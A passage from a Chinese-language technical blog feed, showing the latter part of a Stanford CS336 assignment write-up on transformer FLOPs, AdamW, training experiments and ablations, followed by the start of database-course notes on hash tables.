(T,T) \times(T,d_k)\)</span></td><td><span class="math inline">\(2T^2d\)</span></td><td>3.36B</td></tr><tr class="odd"><td>FFN W1</td><td><span class="math inline">\((T,d) \times (d,d_{ff})\)</span></td><td><span class="math inline">\(2Td \cdot d_{ff}\)</span></td><td>20.97B</td></tr><tr class="even"><td>FFN W3</td><td>同上</td><td><span class="math inline">\(2Td \cdot d_{ff}\)</span></td><td>20.97B</td></tr><tr class="odd"><td>FFN W2</td><td><span class="math inline">\((T,d_{ff}) \times(d_{ff},d)\)</span></td><td><span class="math inline">\(2Td \cdot d_{ff}\)</span></td><td>20.97B</td></tr><tr class="even"><td><strong>每层总计</strong></td><td></td><td></td><td><strong>90.60B</strong></td></tr></tbody></table><p><strong>模型级 FLOPs：</strong></p><table><thead><tr class="header"><th>组件</th><th>FLOPs</th></tr></thead><tbody><tr class="odd"><td>48 层</td><td>4,348.7B</td></tr><tr class="even"><td>LM 头: <span class="math inline">\((T,d) \times (d,V)\)</span></td><td>164.7B</td></tr><tr class="odd"><td><strong>总计</strong></td><td><strong>≈ 4.51 TFLOPs</strong></td></tr></tbody></table><h4 id="flops-在模型大小之间的细分">3.11.5 FLOPs在模型大小之间的细分</h4><p><strong>(c)</strong> 每层，FFN 占 ~69.5%（62.91B /90.60B），使其成为计算最密集的组件。注意力投影占23.1%，而注意力分数（<span class="math inline">\(QK^T\)</span> +attn×V）仅占 7.4%。</p><table><colgroup><col style="width: 25%" /><col style="width: 18%" /><col style="width: 20%" /><col style="width: 19%" /><col style="width: 16%" /></colgroup><thead><tr class="header"><th>组件</th><th>小型 (12L, 768)</th><th>中型 (24L, 1024)</th><th>大型 (36L, 1280)</th><th>XL (48L, 1600)</th></tr></thead><tbody><tr class="odd"><td>注意力投影</td><td>16.6%</td><td>20.0%</td><td>21.4%</td><td>22.3%</td></tr><tr class="even"><td>注意力分数 (<span class="math inline">\(QK^T\)</span> 等)</td><td>11.1%</td><td>10.0%</td><td>8.6%</td><td><strong>7.1%</strong></td></tr><tr class="odd"><td>FFN</td><td>49.7%</td><td>59.9%</td><td>64.2%</td><td><strong>66.9%</strong></td></tr><tr class="even"><td>LM 头</td><td>22.6%</td><td>10.2%</td><td>5.8%</td><td>3.7%</td></tr></tbody></table><p><strong>(d) 趋势</strong>：随着模型变大，FFN 的比例增加（50% →67%），而 LM 头的比例显著下降（23% → 4%）。这是因为 LM头在每层的大小是固定的（与 vocab_size 相关），而 FFN 随着层数和 d_model的增加而增长。</p><h4 id="上下文长度缩放为什么-flashattention-重要">3.11.6上下文长度缩放：为什么 FlashAttention 重要</h4><p><strong>(e)</strong> 将上下文长度从 1024 增加到 16384：</p><table><thead><tr class="header"><th>组件</th><th>T=1024</th><th>T=16384</th></tr></thead><tbody><tr class="odd"><td>注意力投影</td><td>22.3%</td><td>10.8%</td></tr><tr class="even"><td>注意力分数</td><td><strong>7.1%</strong></td><td><strong>55.2%</strong></td></tr><tr class="odd"><td>FFN</td><td>66.9%</td><td>32.3%</td></tr><tr class="even"><td>LM 头</td><td>3.7%</td><td>1.8%</td></tr><tr class="odd"><td><strong>总 FLOPs</strong></td><td><strong>4.51T</strong></td><td><strong>≈ 149.5T (33×)</strong></td></tr></tbody></table><p>总 FLOPs 增加约 33×（而不是 16×！），因为注意力分数的缩放为 <spanclass="math inline">\(O(T^2)\)</span>。当上下文长度增长 16×时，注意力分数从 7.1% 跃升至55.2%，成为主导成本。这正是为什么长上下文模型需要<strong>FlashAttention</strong> 和其他 IO感知的注意力优化——二次注意力成本在长序列中压倒了线性 FFN 成本。</p><h4 id="为什么反向传播-2-前向">3.11.7 为什么反向传播 ≈ 2× 前向？</h4><p>对于每个矩阵乘法 <span class="math inline">\(Y =XW\)</span>，反向传播需要计算两个梯度：</p><ul><li><span class="math inline">\(\frac{\partial L}{\partial X} =\frac{\partial L}{\partial Y} \times W^T\)</span>（一个矩阵乘法）</li><li><span class="math inline">\(\frac{\partial L}{\partial W} = X^T\times \frac{\partial L}{\partial Y}\)</span>（一个矩阵乘法）</li></ul><p>这就是反向传播需要 <strong>2 次矩阵乘法</strong>，而前向传播只需要 1次。因此：</p><p><span class="math display">\[\boxed{\text{反向} \approx 2 \times \text{前向}}\]</span></p><p><span class="math display">\[\text{总计 = 前向 + 反向} \approx 3 \times \text{前向} = 6PBT\]</span></p><h4 id="adamw-每步-flops">3.11.8 AdamW 每步 FLOPs</h4><p>每个参数执行的操作：</p><table><colgroup><col style="width: 13%" /><col style="width: 48%" /><col style="width: 37%" /></colgroup><thead><tr class="header"><th>操作</th><th>公式</th><th>每个参数的 FLOPs</th></tr></thead><tbody><tr class="odd"><td>更新 m</td><td><span class="math inline">\(m = \beta_1 m +(1-\beta_1)g\)</span></td><td>3（2 次乘法 + 1 次加法）</td></tr><tr class="even"><td>更新 v</td><td><span class="math inline">\(v = \beta_2 v +(1-\beta_2)g^2\)</span></td><td>4（3 次乘法 + 1 次加法）</td></tr><tr class="odd"><td>参数更新</td><td><span class="math inline">\(p = \alpha_t \cdotm/(\sqrt{v}+\epsilon)\)</span></td><td>5（平方根、加法、除法、乘法、减法）</td></tr><tr class="even"><td>权重衰减</td><td><span class="math inline">\(p -= lr \times \lambda \timesp\)</span></td><td>2（乘法 + 减法）</td></tr></tbody></table><p><span class="math display">\[\text{AdamW FLOPs} = 14P\]</span></p><p>（偏差校正 <span class="math inline">\(\alpha_t\)</span>是标量计算，可以忽略。远小于前向/反向 FLOPs。）</p><h4 id="gpt-2-xl-训练时间估计">3.11.9 GPT-2 XL 训练时间估计</h4><p><strong>每步 FLOPs</strong>：</p><ul><li>前向 ≈ <span class="math inline">\(2P \times B \timesT\)</span>（每个参数每个标记大约执行 ~2 次操作）</li><li>反向 ≈ <span class="math inline">\(2 \times\)</span> 前向</li><li>总计 ≈ <span class="math inline">\(3 \times\)</span> 前向 = <spanclass="math inline">\(6PBT\)</span></li></ul><p>替换 GPT-2 XL（<span class="math inline">\(B=1024,T=1024\)</span>）： <span class="math display">\[\text{每步} = 6 \times 2.13 \times 10^9 \times 1024 \times 1024 = 1.34\times 10^{16} \text{ FLOPs/步}\]</span></p><p><strong>总计 400K 步</strong>：<span class="math inline">\(400{,}000\times 1.34 \times 10^{16} = 5.36 \times 10^{21}\)</span> FLOPs</p><p><strong>有效吞吐量</strong>：50% × 19.5 TFLOP/s = <spanclass="math inline">\(9.75 \times 10^{12}\)</span> FLOP/s</p><p><span class="math display">\[\text{时间} = \frac{5.36 \times 10^{21}}{9.75 \times 10^{12}} \approx5.5 \times 10^8 \text{ 秒} \approx 6{,}360 \text{ 天} \approx\boxed{17.4 \text{ 年}}\]</span></p><p>这解释了为什么大规模模型训练需要大量 GPU 并行性——在单个 A100 上训练GPT-2 XL 将需要 17 年！</p><hr /><h2 id="训练基础设施">4. 训练基础设施</h2><h3 id="交叉熵损失">4.1 交叉熵损失</h3><p>使用对数和指数技巧的数值稳定实现：</p><p><span class="math display">\[\ell_i = -\log \text{softmax}(o_i)[x_{i+1}] = \log\left(\sum_j e^{o_j -o_{\max}}\right) - (o_{x_{i+1}} - o_{\max})\]</span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cross_entropy</span>(<span class="params">inputs, targets</span>):</span><br><span class="line">    shifted = inputs - inputs.<span class="built_in">max</span>(dim=-<span class="number">1</span>, keepdim=<span class="literal">True</span>).values</span><br><span class="line">    log_sum_exp = torch.log(torch.<span class="built_in">sum</span>(torch.exp(shifted), dim=-<span class="number">1</span>))</span><br><span class="line">    target_logits = shifted.gather(dim=-<span class="number">1</span>, index=targets.unsqueeze(-<span class="number">1</span>)).squeeze(-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> (log_sum_exp - target_logits).mean()</span><br></pre></td></tr></table></figure><h3 id="adamw-优化器">4.2 AdamW 优化器</h3><p>实现 AdamW（Loshchilov &amp; Hutter, 2019）与<strong>解耦权重衰减</strong>：</p><p><span class="math display">\[m_t = \beta_1 m_{t-1} + (1 - \beta_1) g_t\]</span></p><p><span class="math display">\[v_t = \beta_2 v_{t-1} + (1 - \beta_2) g_t^2\]</span></p><p><span class="math display">\[\hat{\alpha}_t = \alpha \cdot \frac{\sqrt{1 - \beta_2^t}}{1 - \beta_1^t}\]</span></p><p><span class="math display">\[\theta_t = \theta_{t-1} - \hat{\alpha}_t \cdot \frac{m_t}{\sqrt{v_t} +\epsilon} - \alpha \lambda \theta_{t-1}\]</span></p><p>与 L2 正则化的关键区别：权重衰减作为单独步骤应用，使用<strong>基础学习率</strong> <spanclass="math inline">\(\alpha\)</span>，而不是偏差校正率。这是 AdamW的“解耦”部分。</p><p><strong>AdamW 内存计算</strong>：对于每个参数，AdamW 维护 2个附加张量（<span class="math inline">\(m\)</span> 和 <spanclass="math inline">\(v\)</span>），因此优化器状态在内存中需要<strong>2× 模型参数</strong>。加上模型权重，总计为 <strong>3×模型大小</strong>（不包括梯度）。包括梯度后，内存需求为 <strong>4×模型大小</strong>，以 float32 计。</p><h3 id="余弦学习率调度与预热">4.3 余弦学习率调度与预热</h3><p>三个阶段（遵循 LLaMA）：</p><ol type="1"><li><strong>线性预热</strong>（<span class="math inline">\(t &lt;T_w\)</span>）：<span class="math inline">\(\alpha_t = \frac{t}{T_w}\cdot \alpha_{\max}\)</span></li><li><strong>余弦退火</strong>（<span class="math inline">\(T_w \leq t\leq T_c\)</span>）：<span class="math inline">\(\alpha_t =\alpha_{\min} + \frac{1}{2}(1 + \cos(\frac{t - T_w}{T_c - T_w} \cdot\pi)) \cdot (\alpha_{\max} - \alpha_{\min})\)</span></li><li><strong>恒定最小值</strong>（<span class="math inline">\(t &gt;T_c\)</span>）：<span class="math inline">\(\alpha_t =\alpha_{\min}\)</span></li></ol><p><strong>预热的目的</strong>：在训练的早期阶段，模型参数是随机初始化的，梯度可能非常嘈杂且大。学习率预热可以防止优化器采取过大的步骤，从而可能导致训练不稳定或发散。它为Adam的动量估计提供了时间，以便在使用完整学习率之前积累有意义的统计数据。</p><h3 id="梯度裁剪">4.4 梯度裁剪</h3><p>L2 范数梯度裁剪以确保训练稳定性：</p><p><span class="math display">\[\text{如果 } \|g\|_2 &gt; M: \quad g \leftarrow g \cdot \frac{M}{\|g\|_2+ \epsilon}\]</span></p><p>其中 <span class="math inline">\(M\)</span> 是最大允许范数（通常为1.0），<span class="math inline">\(\epsilon = 10^{-6}\)</span>。</p><hr /><h2 id="训练循环">5. 训练循环</h2><h3 id="数据加载">5.1 数据加载</h3><p>对于包含 <span class="math inline">\(n\)</span>个标记的数据集，每个批次随机采样 <span class="math inline">\(B\)</span>个起始位置并创建：</p><ul><li><strong>输入</strong>：<code>dataset[i : i + context_length]</code></li><li><strong>目标</strong>：<code>dataset[i+1 : i+1 + context_length]</code></li></ul><p>数据存储为内存映射的 uint16 numpy数组，以便高效随机访问，而无需将整个数据集加载到 RAM 中。</p><h3 id="检查点">5.2 检查点</h3><p>检查点保存：</p><ul><li><code>model_state_dict</code>：所有模型参数</li><li><code>optimizer_state_dict</code>：优化器状态（动量、步数）</li><li><code>iteration</code>：当前训练步骤</li></ul><p>这使得可以从任何检查点恢复训练，并完全恢复优化器状态。</p><h3 id="训练配置">5.3 训练配置</h3><p><strong>TinyStories（默认实验）：</strong></p><table><thead><tr class="header"><th>参数</th><th>值</th></tr></thead><tbody><tr class="odd"><td>词汇表大小</td><td>10,000</td></tr><tr class="even"><td>上下文长度</td><td>256</td></tr><tr class="odd"><td>d_model</td><td>512</td></tr><tr class="even"><td>层数</td><td>4</td></tr><tr class="odd"><td>头数</td><td>16</td></tr><tr class="even"><td>d_ff</td><td>1,344</td></tr><tr class="odd"><td>学习率</td><td>1e-3（变化）</td></tr><tr class="even"><td>批量大小</td><td>256（变化）</td></tr><tr class="odd"><td>最大步骤</td><td>5,000</td></tr><tr class="even"><td>预热步骤</td><td>500</td></tr><tr class="odd"><td>权重衰减</td><td>0.1</td></tr><tr class="even"><td>梯度裁剪</td><td>1.0</td></tr></tbody></table><hr /><h2 id="文本生成">6. 文本生成</h2><h3 id="自回归生成">6.1 自回归生成</h3><p>模型一次生成一个标记的文本：</p><ol type="1"><li>将提示编码为令牌 ID</li><li>通过模型获取下一个标记的对数</li><li>应用<strong>温度缩放</strong>：<code>logits / temperature</code></li><li>（可选）应用 <strong>top-p / 核采样</strong>：仅保留累积概率 ≤ p的标记</li><li>从结果分布中采样</li><li>附加采样的标记并重复</li></ol><p><strong>温度</strong> 控制随机性：</p><ul><li><code>T → 0</code>：贪婪（argmax），确定性但重复</li><li><code>T = 1.0</code>：从模型的分布中标准采样</li><li><code>T &gt; 1.0</code>：更随机，更多样但可能不连贯</li></ul><p><strong>Top-p（核）采样</strong>（Holtzman et al.,2019）：与从完整分布中采样不同，仅保留累积概率超过 <spanclass="math inline">\(p\)</span>的最小标记集，然后重新归一化。这根据模型的置信度动态调整候选标记的数量。</p><h3 id="生成样本">6.2 生成样本</h3><p>来自 TinyStories 模型的示例生成（温度=0.8，top_p=0.9）：</p><blockquote><p><strong>提示</strong>：“从前有一个”</p><p>从前有一个小女孩，名叫Lily。她喜欢在公园外面玩耍。一天，她在地上看到一个大红球。她捡起它，开始弹跳。“看，妈妈！”她说。“我找到一个球了！”她的妈妈微笑着说：“那是个好发现，Lily……”</p></blockquote><p>模型成功学习到：</p><ul><li><strong>连贯的叙事结构</strong>，具有开头、中间和结尾</li><li><strong>正确的语法</strong>和对话格式</li><li><strong>角色一致性</strong>（名称、代词）</li><li><strong>儿童故事的典型故事惯例</strong>（道德、简单冲突）</li></ul><p>注意：<code>&lt;|endoftext|&gt;</code>标记有时会出现在生成中。这不是一个错误——它是训练数据中使用的<strong>文档分隔符</strong>。模型学习到这个标记标记故事之间的边界，并可能在其后生成新故事。</p><hr /><h2 id="实验">7. 实验</h2><p>除非另有说明，所有实验均使用 TinyStories 数据集，配置如第 5.3节所述。结果通过 Weights &amp; Biases 记录。</p><h3 id="学习率扫描">7.1 学习率扫描</h3><p><strong>设置</strong>：固定batch_size=256，max_steps=5000，warmup=500。扫描 lr ∈ {5e-4, 1e-3, 2e-3,5e-3, 1e-2}。</p><table><thead><tr class="header"><th>学习率</th><th>最终验证损失</th><th>验证困惑度</th></tr></thead><tbody><tr class="odd"><td>1e-2</td><td><strong>1.3004</strong></td><td><strong>3.671</strong></td></tr><tr class="even"><td>5e-3</td><td>1.3171</td><td>3.733</td></tr><tr class="odd"><td>2e-3</td><td>1.3567</td><td>3.883</td></tr><tr class="even"><td>1e-3</td><td>1.3974</td><td>4.045</td></tr><tr class="odd"><td>5e-4</td><td>1.4930</td><td>4.450</td></tr></tbody></table><p><strong>分析</strong>：较高的学习率在 5000步内始终实现较低的损失。最佳学习率为 lr=1e-2，验证损失为1.3004，困惑度为3.671。这有些令人惊讶——人们可能会期望如此高的学习率会导致不稳定，但预热、余弦退火、梯度裁剪和RMSNorm 的组合提供了足够的正则化。</p><p>在这个范围内的趋势是单调的：更高的 LR →更低的损失。这表明模型仍处于受益于更激进优化的状态，可能是因为 5000步对于这个模型大小来说相对较少。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260208225124153.png" alt="image-20260208225124153" style="zoom:50%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260208224958480.png" alt="image-20260208224958480" style="zoom:80%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260208225043193.png" alt="image-20260208225043193" style="zoom:80%;" /></p><h3 id="批量大小实验">7.2 批量大小实验</h3><p><strong>设置</strong>：固定lr=1e-3，变化批量大小，并相应调整步骤，以保持大致相同的标记更新数量。</p><table><thead><tr class="header"><th>批量大小</th><th>步数</th><th>最终验证损失</th><th>验证困惑度</th></tr></thead><tbody><tr class="odd"><td>16</td><td>80,000</td><td><strong>1.3264</strong></td><td><strong>3.768</strong></td></tr><tr class="even"><td>64</td><td>20,000</td><td>1.3318</td><td>3.788</td></tr><tr class="odd"><td>128</td><td>10,000</td><td>1.3560</td><td>3.881</td></tr><tr class="even"><td>512</td><td>2,500</td><td>1.4805</td><td>4.395</td></tr></tbody></table><p><strong>分析</strong>：较小的批量大小在相同的总标记数量下实现了更好的最终损失。最佳结果是批量大小为16，验证损失为 1.3264。</p><p>这与“泛化差距”理论一致：较小的批量引入了更多的梯度估计噪声，这作为隐式正则化，可以导致更平坦的最小值，从而实现更好的泛化。然而，较小的批量由于较低的硬件利用率而计算成本更高。</p><p>在实践中，批量大小的选择涉及以下权衡：</p><ul><li><strong>计算效率</strong>：较大的批量更好地利用 GPU 并行性</li><li><strong>泛化</strong>：较小的批量通常具有更好的泛化能力</li><li><strong>收敛速度</strong>：较小的批量需要更多的步骤，但看到相同数量的标记</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260208225239934.png" alt="image-20260208225239934" style="zoom:80%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260208225353926.png" alt="image-20260208225353926" style="zoom:80%;" /></p><h3 id="消融研究">7.3 消融研究</h3><p><strong>设置</strong>：固定lr=1e-3，batch_size=256，max_steps=5000。每个消融修改基线架构的一个方面。</p><table><colgroup><col style="width: 55%" /><col style="width: 17%" /><col style="width: 17%" /><col style="width: 8%" /></colgroup><thead><tr class="header"><th>配置</th><th>最终验证损失</th><th>验证困惑度</th><th>Δ 损失</th></tr></thead><tbody><tr class="odd"><td><strong>基线</strong>（预归一化 + RMSNorm + RoPE + SwiGLU）</td><td><strong>1.3974</strong></td><td><strong>4.045</strong></td><td>—</td></tr><tr class="even"><td>后归一化（而不是预归一化）</td><td>1.4095</td><td>4.094</td><td>+0.0121</td></tr><tr class="odd"><td>无 RMSNorm（恒等归一化）</td><td>1.4400</td><td>4.221</td><td>+0.0426</td></tr><tr class="even"><td>SiLU FFN（而不是 SwiGLU）</td><td>1.4649</td><td>4.327</td><td>+0.0675</td></tr><tr class="odd"><td>无 RoPE（NoPE — 无位置编码）</td><td>1.4712</td><td>4.354</td><td>+0.0738</td></tr></tbody></table><p><strong>按组件重要性分析</strong>（从最重要到最不重要）：</p><ol type="1"><li><p><strong>RoPE</strong>（Δ =+0.074）：影响最大的组件。没有位置编码，模型无法区分标记顺序。值得注意的是，NoPE仍然可以达到合理的困惑度（4.354），这表明模型可以部分通过语义上下文和因果掩码推断顺序。但位置信息显然提供了显著的提升。</p></li><li><p><strong>SwiGLU</strong>（Δ = +0.068）：用 SiLU FFN 替换SwiGLU（匹配参数计数）使损失增加 0.068。SwiGLU中的门控机制提供了更细致的信息流控制，从而导致更好的表示学习。</p></li><li><p><strong>RMSNorm</strong>（Δ =+0.043）：完全去除归一化会降低性能，确认了归一化对训练稳定性和表示质量的重要性。没有它，激活可能通过残差连接无限增长。</p></li><li><p><strong>预归一化与后归一化</strong>（Δ =+0.012）：差异最小。后归一化略微表现不如预归一化，与文献中显示的预归一化更稳定的训练一致。然而，对于这个模型大小和训练时长，差距很小。</p></li></ol><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260208230125952.png" alt="image-20260208230125952" style="zoom:80%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260208230058900.png" alt="image-20260208230146528" style="zoom:100%;" /></p><h3 id="openwebtext-owt-训练">7.4 OpenWebText (OWT) 训练</h3><p><strong>设置</strong>：GPT-2 小型架构（117M 参数）在 OpenWebText上训练。</p><table><thead><tr class="header"><th>参数</th><th>值</th></tr></thead><tbody><tr class="odd"><td>配置</td><td>GPT-2 小型</td></tr><tr class="even"><td>词汇表大小</td><td>50,257</td></tr><tr class="odd"><td>上下文长度</td><td>1,024</td></tr><tr class="even"><td>d_model</td><td>768</td></tr><tr class="odd"><td>层数</td><td>12</td></tr><tr class="even"><td>头数</td><td>12</td></tr><tr class="odd"><td>d_ff</td><td>2,048</td></tr><tr class="even"><td>批量大小</td><td>8</td></tr><tr class="odd"><td>最大步骤</td><td>10,000</td></tr><tr class="even"><td>学习率</td><td>1e-3</td></tr></tbody></table><table><thead><tr class="header"><th>指标</th><th>值</th></tr></thead><tbody><tr class="odd"><td>最终验证损失</td><td>3.9364</td></tr><tr class="even"><td>最终验证困惑度</td><td>51.236</td></tr></tbody></table><p><strong>分析</strong>：OWT 训练在 10K 步的训练中实现了约 51的验证困惑度，这对于 117M 参数模型来说是合理的。作为参考：</p><ul><li>GPT-2（117M）训练 300K 步在 WebText 上实现了约 30 的困惑度</li><li>我们的模型看到的标记数量远少于此，但在训练过程中显示出明显的学习（损失持续下降）</li></ul><p>主要瓶颈是 <strong>GPU 内存</strong>：batch_size=64 和上下文长度=1024在单个 80GB A100 上导致 OOM。减少到 batch_size=8解决了这个问题，但这意味着每步处理的标记更少。可以使用梯度累积来模拟更大的有效批量大小，而无需额外的内存成本。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260208230235210.png" alt="image-20260208230235210" style="zoom:80%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260208230218497.png" alt="image-20260208230218497" style="zoom:80%;" /></p><hr /><h2 id="反思">8. 反思</h2><h3 id="我学到了什么">8.1 我学到了什么</h3><p><strong>从头实现很重要。</strong> 从 <code>nn.Parameter</code> 和<code>torch.empty</code>构建每个组件迫使你理解每一步的确切数据流、形状和数值考虑。例如：</p><ul><li><p><strong>RMSNorm 精度</strong>：如果不转换为float32，均方根计算可能在 float16/bfloat16 中溢出，导致 NaN损失。这是一个微妙的错误，在 float32 的单元测试中无法捕获。</p></li><li><p><strong>权重初始化</strong>：截断正态初始化对训练稳定性有显著影响。过宽→ 梯度爆炸；过窄 → 梯度消失。公式 <span class="math inline">\(\sigma =\sqrt{2/(d_{in} + d_{out})}\)</span>（类似Glorot）保持各层之间的方差大致恒定。</p></li><li><p><strong>因果掩码效率</strong>：将因果掩码预计算为缓冲区并在每次前向传递时切片，比每次都新建它要高效得多，尤其是对于长序列。</p></li></ul><p><strong>分词器训练是隐藏的瓶颈。</strong> 在大型语料库上进行 BPE训练需要仔细的内存管理：</p><ul><li>预分词可能生成数百万个唯一字节序列</li><li>对频率表可能增长到数十 GB</li><li>如果没有增量索引更新，每次合并迭代的复杂度将是 O(corpus_size)</li><li>并行预分词提供了接近线性的加速，但 BPE 合并仍然是顺序的</li></ul><p><strong>超参数敏感性因组件而异。</strong>学习率对训练动态的影响最大，而架构选择（预归一化与后归一化）对小模型的影响可能出乎意料地小。这表明，对于快速实验，花时间调整学习率比架构变化更有价值。</p><h3 id="设计决策">8.2 设计决策</h3><ol type="1"><li><p><strong>共享 RoPE 模块</strong>：而不是每个注意力层创建自己的RoPE，而是所有层共享一个实例。这节省了内存并确保一致的位置编码。</p></li><li><p><strong>通过构造函数参数支持消融</strong>：而不是为每个消融创建单独的模型类，<code>TransformerBlock</code>和 <code>TransformerLM</code>接受配置标志（<code>norm_type</code>、<code>use_post_norm</code>、<code>use_rope</code>、<code>ffn_type</code>）。这保持了代码库的DRY，同时支持所有实验变体。</p></li><li><p><strong>内存映射数据加载</strong>：使用 <code>np.memmap</code>处理训练数据，避免将整个数据集加载到 RAM中。随机批量采样仅读取所需的切片，使得在比可用内存更大的数据集上进行训练成为可能。</p></li><li><p><strong>并行分词器编码</strong>：<code>encode_parallel</code>方法在 <code>&lt;|endoftext|&gt;</code>边界处拆分文本，并行编码块，将中间结果保存到磁盘并合并。这支持恢复并避免在大型文本上出现OOM。</p></li></ol><h3 id="我会做的不同的事情">8.3 我会做的不同的事情</h3><ul><li><strong>学习率预热调整</strong>：我在所有实验中使用了固定的 500预热步骤。根据配置调整这个值（例如，与总步骤成比例）可能会改善结果。</li><li><strong>梯度累积</strong>：对于 OWT 实验，实施梯度累积将允许在保持GPU 内存限制的情况下使用有效批量大小为 64+，每步为 8。</li><li><strong>混合精度训练</strong>：使用 <code>torch.cuda.amp</code> 和bfloat16将减少内存使用并提高吞吐量，可能使更大的批量大小或更多步骤成为可能。</li><li><strong>生成的 KV缓存</strong>：当前的生成实现为每个新标记重新计算所有注意力分数。KV缓存将存储过去的键值对，从而将生成成本从 O(n²) 降低到 O(n)。</li></ul><hr /><p><em>这篇博客文章记录了 CS336 作业 1（2025年春季）的实现。所有代码均在 PyTorch中从头编写，实验在匹兹堡超级计算中心（PSC）的 NVIDIA H100 GPU上运行。</em></p>]]></content>
      
      
      <categories>
          
          <category> Stanford CS336 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> AI </tag>
            
            <tag> Transformer </tag>
            
            <tag> Assignment </tag>
            
            <tag> LLM </tag>
            
            <tag> CS336 </tag>
            
            <tag> Stanford </tag>
            
            <tag> PyTorch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>15645 Database systems: Hash Tables</title>
      <link href="/zh/2026/02/07/15645-Database-Systems/15645-Database-systems-Hash-Tables/"/>
      <url>/zh/2026/02/07/15645-Database-Systems/15645-Database-systems-Hash-Tables/</url>
      
        <content type="html"><![CDATA[<h1 id="lec7-哈希表">Lec7 哈希表</h1><h2 id="背景">背景</h2><p><strong>数据库管理系统中的数据结构</strong>：内部元数据、核心数据存储、临时数据结构、表索引</p><p><strong>设计决策</strong>：<u>数据组织</u>（我们如何在内存/页面中布局数据以及存储哪些信息以支持高效访问）和<strong>并发性</strong>（使多个线程能够同时访问数据结构）</p><p><strong>哈希表</strong>：<u>无序关联数组</u>，将键映射到值；<u>空间复杂度为O(n)</u>，<u>时间复杂度平均为 O(1)，最坏情况为 O(n)</u>。</p><p><strong>不切实际的假设</strong>：元素数量是<u>事先已知且固定的</u>；每个键是<u>唯一的</u>；完美的哈希函数保证<u>没有冲突</u>。</p><h2 id="哈希函数">哈希函数</h2><p>我们关心如何将一个大的键空间映射到一个较小的域，主要目标是<strong>速度</strong>与<strong>冲突率</strong>之间的权衡。</p><p>示例：CRC-64 (1975)、MurmurHash (2008)、Google CityHash(2011)、Facebook XXHash (2012，最先进)、Google FarmHash(2014)、RapidHash (2019)</p><h2 id="静态哈希方案">静态哈希方案</h2><h3 id="线性探测哈希">线性探测哈希</h3><p>单个固定长度槽的巨大表。</p><p>通过线性搜索表中下一个空槽来解决冲突。</p><ul><li>要确定元素是否存在，哈希到表中的一个位置并进行扫描。</li><li>在表中存储键以知道何时停止扫描。</li><li>插入和删除是查找的推广。</li></ul><p>表的<strong>负载因子</strong>决定何时变得过满并应进行调整大小。</p><blockquote><p>负载因子 = 活跃键 /槽数量；分配一个新表，大小是原来的两倍，并重新哈希条目。</p></blockquote><p><strong>键值条目</strong>：</p><ul><li>固定长度：内联存储或可选择与键一起存储键的哈希以加快比较。</li><li>可变长度：将kv数据插入单独的私有临时表，并存储哈希 + RecordId。</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260207135932206.png" alt="image-20260207135932206" style="zoom:33%;" /></p><p><strong>删除策略</strong>：</p><ul><li>移动：删除后，向前扫描并重新哈希每个键，直到遇到空槽以填补空缺。<strong>代价高昂；没有DBMS使用此方法。</strong></li><li>墓碑：将槽标记为已删除。查找跳过它；插入可以重用它。需要定期垃圾回收。这是大家都在使用的方法。</li></ul><p><strong>非唯一键</strong>：</p><ul><li>分离链表</li><li>冗余键</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260207141247097.png" alt="image-20260207141247097" style="zoom:33%;" /></p><p><strong>优化</strong>：</p><ul><li><strong>按键类型/大小专业化</strong>：使用不同的哈希表实现，针对不同的键大小（例如，短字符串与长字符串）进行优化，以实现更快的比较。</li><li><strong>单独存储元数据</strong>：单独存储一个打包的位图以跟踪槽状态（空/墓碑/占用）。扫描位图比触碰每个满槽更具缓存友好性。</li><li><strong>表 +槽版本控制</strong>：每个槽在写入时记录表版本。要清除整个表，只需递增全局版本——任何具有过时版本的槽都视为空。O(1)批量失效。</li></ul><h3 id="布谷鸟哈希">布谷鸟哈希</h3><p>使用<strong>多个哈希</strong>函数在哈希表中查找多个位置以插入记录。</p><ul><li>在<strong>插入时，检查多个位置</strong>并选择一个空的。</li><li>如果没有可用位置，<strong>驱逐其中一个元素</strong>，然后重新哈希以找到新位置。</li></ul><h2 id="动态哈希方案">动态哈希方案</h2><p>之前的哈希表要求DBMS知道它想要存储的元素数量。否则，如果需要增大/缩小大小，它<u>必须重建表</u>。</p><p>动态哈希表<u>根据需要逐步调整大小</u>。</p><h3 id="链式哈希">链式哈希</h3><p>为哈希表中的每个槽维护一个桶的链表。</p><p>通过将所有具有相同哈希键的元素放入同一个桶来解决冲突。</p><p>我们可以添加布隆过滤器来帮助过滤不存在的键。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260207142956981.png" alt="image-20260207142956981" style="zoom:30%;" /></p><h3 id="可扩展哈希">可扩展哈希</h3><p>链式哈希方法，逐步拆分桶，而不是让链表无限增长。</p><p>多个槽位置可以指向同一个桶链。</p><p>在拆分时重新排列桶条目，并增加要检查的位数。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260207144821584.png" alt="image-20260207144821584" style="zoom:40%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260207145132035.png" alt="image-20260207145132035" style="zoom:33%;" /></p><h3 id="线性哈希">线性哈希</h3><p><strong>线性哈希</strong>：维护一个顺序推进的拆分指针。当任何桶溢出时，在拆分指针处拆分桶（而不是溢出的那个），使用<code>hash2 = key % 2n</code> 